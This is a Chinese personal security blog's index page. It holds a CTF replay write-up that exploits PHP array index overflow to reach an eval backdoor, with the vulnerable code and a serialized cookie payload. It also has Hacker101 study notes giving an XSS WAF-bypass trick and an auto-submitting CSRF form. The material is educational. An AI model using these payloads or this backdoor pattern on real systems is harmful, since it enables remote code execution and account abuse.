<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>inanb</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="inanb"><meta name="msapplication-TileImage" content="img/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="inanb"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="铁马冰河入梦来"><meta property="og:type" content="blog"><meta property="og:title" content="inanb"><meta property="og:url" content="https://removeif.github.io/"><meta property="og:site_name" content="inanb"><meta property="og:description" content="铁马冰河入梦来"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><meta property="article:author" content="removeif"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"inanb","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"inanb"},"description":"铁马冰河入梦来"}</script><link rel="icon" href="/img/favicon.ico"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/music">音色</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-5-tablet is-9-desktop is-7-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-05-08  <a class="commentCountImg" href="/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/#comment-container"><span class="display-none-class">/2021/05/08/蓝帽杯2021复现/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="755fe1ad916c0e252dfab1894b6b7c0a">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>5 分钟  <i class="fas fa-pencil-alt"> </i>0.8 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/">蓝帽杯2021复现</a></h1><div class="content"><h3><span id="蓝帽杯2021复现">蓝帽杯2021复现</span></h3><h4><span id="one_pointer_php">one_Pointer_php</span></h4><p>buu上开了环境，真不错</p>
<p>user.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>add_api.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">		$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$user=<span class="keyword">new</span> User;</span><br><span class="line">	$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>就两个文件……</p>
<p>当时看了半天，就只知道要绕过<code>if($count[]=1)</code>……可这玩意不是恒对的吗……</p>
<p>这关系到php的索引数组溢出</p>
<h5><span id="php数组">PHP数组</span></h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43821278/article/details/114763459">https://blog.csdn.net/weixin_43821278/article/details/114763459</a></p>
<p>根据这篇文章的实验</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php 5.59nts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a[<span class="number">2147483647</span>]=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">$a[]=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="D:\HexoBlog\source\images\蓝帽杯2021复现\image-20210508181911478.png" alt="image-20210508181911478"></p>
<blockquote>
<p>$a[]访问到的是当前最大数值索引的下一位</p>
</blockquote>
<p>也就是说，在5.5.9nts版本下，2147483647就是数值索引的界限，而2147483647正是5.5.9版本中默认设置的整型最大值：<code>PHP_INT_MAX:int(2147483647)</code>。</p>
<p>这里的int，是<strong>有符号32位二进制可表示的最大数</strong>。</p>
<blockquote>
<p><strong>2^31-1</strong>=<strong>2147483647</strong></p>
</blockquote>
<p>如果超过了呢？</p>
<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165829865.png" alt="image-20210513165829865"></p>
<p>这里会转化为范围更大的float储存……</p>
<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165839374.png" alt="image-20210513165839374"></p>
<p>数组中溢出后就会回滚从int的最小值，于是会符合这样的规律：</p>
<blockquote>
<p>0—2147483647                       下标0~2147483647 </p>
<p>2147483648—4294967296   下标-2147483648~0 </p>
<p>4294967296—6442450943   下标 0~2147483647</p>
<p>下一个溢出为0的数字是：8589934592</p>
</blockquote>
<p>这样使用似乎没什么问题，但如果是通过<code>$a[]</code>去获取就会产生报错，相关版本的题目是<code>XCTF-favorite_number</code>，可以研究研究。</p>
<h5><span id="较新的版本">较新的版本</span></h5><p>这里是7.3.4nts的php版本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MAX：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MAX);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MIN：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MIN);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_SIZE：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_SIZE);</span><br><span class="line"></span><br><span class="line">$a =<span class="number">9223372036854775806</span>;</span><br><span class="line">$b =<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_int：&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_float：&quot;</span>;</span><br><span class="line">var_dump(is_float($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输出：</span><br><span class="line">PHP_INT_MAX：int(9223372036854775807)</span><br><span class="line">PHP_INT_MIN：int(-9223372036854775808)</span><br><span class="line">PHP_INT_SIZE：int(8)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">is_int：bool(false)</span><br><span class="line">is_float：bool(true)</span><br><span class="line">9223372036854775806</span><br><span class="line">9223372036854775807</span><br><span class="line">9.2233720368548E+18</span><br></pre></td></tr></table></figure>

<p>同样会转化为float而不再属于整型，并会以科学计数法输出</p>
<p>这里的“int”，是<strong>有符号64位二进制可表示的最大数</strong>，或者说，我们更加熟悉的<strong>long long int</strong>。</p>
<blockquote>
<p><strong>2^63-1</strong>=<strong>9223372036854775807</strong></p>
</blockquote>
<p>较新的版本大概是提高了索引溢出的阈值……</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a[<span class="number">9223372036854775806</span>]=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165907924.png" alt="image-20210513165907924"></p>
<p>最后的语句成功报错，根据这个方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">		$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$user=<span class="keyword">new</span> User;</span><br><span class="line">	$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =<span class="keyword">new</span> User();</span><br><span class="line">$a -&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line">$a =urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>就可以成功绕过赋值判断</p>
<blockquote>
<p>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</p>
</blockquote>
<p>执行命令，来phpinfo看看敏感信息：</p>
<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165922744.png" alt="image-20210513165922744"></p>
<p>……上一个绕过<strong>disable_function</strong>的还是so劫持或者蚁剑插件……不是很会……</p>
<p>看了dalao的wp，一直搞不好……原理倒是看了七七八八……</p>
<p>然后……没有然后了……蹲一个好大佬的wp😢</p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-05-06  <a class="commentCountImg" href="/2021/05/06/hacker101-2/#comment-container"><span class="display-none-class">/2021/05/06/hacker101-2/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="b4a2d8edb25d60b074bf25105944a3a7">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>13 分钟  <i class="fas fa-pencil-alt"> </i>2.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/06/hacker101-2/">hacker101-2</a></h1><div class="content"><h5><span id="hacker1012">hacker101.2</span></h5><p>中文视频：</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1MJ411D75M?from=search&seid=11355973279630099592">【FreeBuf字幕组】Hacker101白帽黑客进阶之路-Web工作机制</a></p>
<p>1.http报文的结构是什么？（1分） </p>
<blockquote>
<p>一个HTTP请求报文由请求行（request line）、请求头部（request header）、空行和请求数据4个部分构成。</p>
<p><strong>请求行</strong>数据格式由三个部分组成：请求方法、URI、HTTP协议版本，他们之间用空格分隔。                                                     </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1 					#请求方法为GET，请求路径为根目录，1.1版本</span><br></pre></td></tr></table></figure>

<p><strong>请求头部</strong>紧跟着请求行，该部分主要是用于描述请求正文                                                                           </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Host: hackerone.com                                                       Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.121 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close		##主要是用于说明请求源、连接类型、Cookie信息、可处理内容等</span><br></pre></td></tr></table></figure>

<p><strong>请求正文</strong>和请求头部通过一个空行进行隔开，一般用于存放POST请求类型的请求正文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin</span><br></pre></td></tr></table></figure>
</blockquote>
<p>2.什么是crlf？在http报文的哪个位置。（1分） </p>
<blockquote>
<table>
<thead>
<tr>
<th><strong>缩写</strong></th>
<th><strong>ASCⅡ转义</strong></th>
<th><strong>系统</strong></th>
<th><strong>ASCⅡ值</strong></th>
</tr>
</thead>
<tbody><tr>
<td>CR</td>
<td>\r</td>
<td>MacIntosh（早期的Mac）</td>
<td>13</td>
</tr>
<tr>
<td>LF</td>
<td>\n</td>
<td>Unix/Linux/Mac OS X</td>
<td>10</td>
</tr>
<tr>
<td>CR LF</td>
<td>\r\n</td>
<td>Windows</td>
<td></td>
</tr>
</tbody></table>
<p>CR：Carriage Return，对应ASCII中转义字符\r，表示回车</p>
<p>LF：Linefeed，对应ASCII中转义字符\n，表示换行</p>
<p>CRLF：Carriage Return &amp; Linefeed，\r\n，表示回车并换行</p>
<p>Windows操作系统采用两个字符来进行换行，即CRLF；</p>
<p>Unix/Linux/Mac OS X操作系统采用单个字符LF来进行换行；</p>
<p>MacIntosh操作系统（即早期的Mac操作系统）采用单个字符CR来进行换行。</p>
<hr>
<p><strong>Burp</strong>中，点击\n即可看到报文中crlf的详细位置，据我目前的经验，crlf可用于csrf和http走私</p>
<p>……</p>
</blockquote>
<p>3.解释下这几个头的含义（5分）： </p>
<img src="/images/week4/image-20210506102725317.png" alt="image-20210506102725317" style="zoom:80%;">

<blockquote>
<p>head头：</p>
<p>Host：表明请求将要发送至的实际主机</p>
<p>Accept：客户端浏览器可处理的MIME类型，设置用来指定响应类型</p>
<p>Cookie：包含客户端向服务器传递的cookie数据</p>
<p>Referer：表明请求具体来源于哪个页面的链接</p>
<p>Authorization：通常用来做一些token认证</p>
</blockquote>
<p>4.cookie具有哪些特点，不同的域名和子域名对cookie有怎样的权限？Cookie的Secure和 HTTPOnly这两个flag分别有什么作用？请结合xss攻击来进行说明（3分） </p>
<blockquote>
<p>若Set-Cookie指定Domain为xxx.com，那么xxx.com的子域名同样能够访问获取到这个Cookie。若指定Domain为某子域名(sub.xxx.com)，那么只有该子域名及其下级子域名才可以访问获得Cookie。</p>
<p>Cookie的Secure属性：这代表Cookie只能在HTTPS协议中传输</p>
<p>Cookie的HTTPOnly属性：确保cookie只能通过Web请求传输，而不能用JavaScript来读取访问。原本可用的document.cookie方法的JS脚本在打开HTTPOnly后无法读取cookie，cookie只在请求中传输。</p>
</blockquote>
<p>5.简述本视频提到的xss绕过web防火墙的方案（5分）</p>
<blockquote>
<p>利用浏览器与WAF对html解析方式不同的特点。&lt;script/xss src=xxxxxx&gt;在浏览器中，/会被解析为%20，而WAF仅仅认为这是一个script/xss样式。这样就绕过了WAF，而浏览器中该标签得以执行。</p>
</blockquote>
<p>6.内容嗅探是什么？主要有哪些类型？请分别举例，主要用途是什么？在什么情况下可以利用这些漏洞？为什么facebook等网站需要使用不同的域名来存储图片？（5分）</p>
<blockquote>
<p><strong>内容嗅探（Content Sniffing）</strong></p>
<p>浏览器在显示响应回来的请求文件或网页时，若不知道该文件或网页的具体文件内容（Content-Type），会启动内容嗅探机制。如：<strong>MIME Sniffing</strong>，它的原理是浏览器回显自动探测未知格式的请求文件类型。另：<strong>Encoding Sniffing</strong>，浏览器会自动检测未知格式文件的编码类型。通过对内容编码格式的一一匹配进行嗅探，后在浏览器中进行相应的解析显示。</p>
<p>在请求响应不具备恰当的MIME类型时，浏览器的具体检测和解析机制可能会导致对文件或图片的不正确解析，导致此类漏洞的发生与利用。</p>
<p>Encoding Sniffing则利用浏览器的自动识别而WAF难以支持的特点(如：UTF-7、UTF-32)完成攻击，之前做过一个xml转码完成攻击的题。</p>
<p>facebook使用子域来托管图片，防止因此类漏洞造成的xss攻击。即使攻击完成，获取到的也可能仅仅是子域下的一个cookie。</p>
</blockquote>
<p>7.同源策略是什么？限制是什么？浏览器在遇到哪两种情况的时候会用到同源策略？如何放松SOP限制？放松SOP限制会对浏览器插件安全造成怎样的破坏？</p>
<blockquote>
<p><strong>同源策略（SOP）</strong></p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p>
<p>Web安全的基石。同源策略目的在于防止Web交互间的不安全行为。同源策略限制了跨域的资源访问。</p>
<p><strong>限制</strong>：协议、端口号、主机（域名）必须相同。</p>
<p>不同域之间是通过XML的HTTP请求来实现交互的，也就是AJAX请求。SOP会限制来自iframe和windows属性的跨域访问和AJAX请求？所以当我们打开一个带有JS脚本的新窗口，由于SOP的影响，那么就无法对该窗口中的DOM元素实现访问。</p>
<p><strong>弱化SOP</strong>：可以通过设置不同域之间的document.domain脚本来实现。这种方式可以让本质上不同源的子域实现互相通信与交互。或者，通过postMessage方法实现跨窗口通信。</p>
<p><strong>破坏</strong>：跨域跨窗口的信息验证很少存在，而Web插件的内部消息处理经常是错误的。如：Chrome的拓展插件就存在SOP绕过漏洞。Chrome的拓展插件在浏览器准备的sandbox中受到了很多限制，所以这些插件常使用postMessage进行设计。当我们向插件发送信息时，可以通过跨窗口通信绕过SOP，实际上这已经破环了浏览器准备的sandbox，是由SOP弱化导致的漏洞。</p>
</blockquote>
<p>8.csrf是什么？如何设计规避csrf？视频中提到的错误的csrf配置方法是什么？ </p>
<blockquote>
<p><strong>CSRF（跨站请求伪造）</strong></p>
<p>攻击者挟持受害者去访问由攻击者控制的网站。并以受害者身份执行请求、提交等恶意操作。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000000&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1625&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的请求直接发送至后端，而后端无法分请请求是否是伪造的。</p>
<p>我们可以使用CSRF-Token来规避此类攻击。Token随机生成并嵌入表单中（CSP……?哦，不一样……</p>
<p>如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>视频中提到有Web应用通过加载csrf.js来生成token，泄露了token的生成方式，这是一种自毁的防御措施。</p>
</blockquote>
<p>附加题：5、6两点主要利用的是由于服务端和客户端对同一信息的处理方式不同造成的漏洞，你还能举出相似的例子么？（1分）</p>
<blockquote>
<p>…………</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-05-04  <a class="commentCountImg" href="/2021/05/04/HarekazeCTF-2019-encode-and-encode/#comment-container"><span class="display-none-class">/2021/05/04/HarekazeCTF-2019-encode-and-encode/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="eddfdc12cf892654035531ba4d4b6f6f">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/04/HarekazeCTF-2019-encode-and-encode/">HarekazeCTF-2019-encode_and_encode</a></h1><div class="content"><h3><span id="harekazectf-2019-encode_and_encode">HarekazeCTF-2019-encode_and_encode</span></h3><p>上来就是源码……：</p>
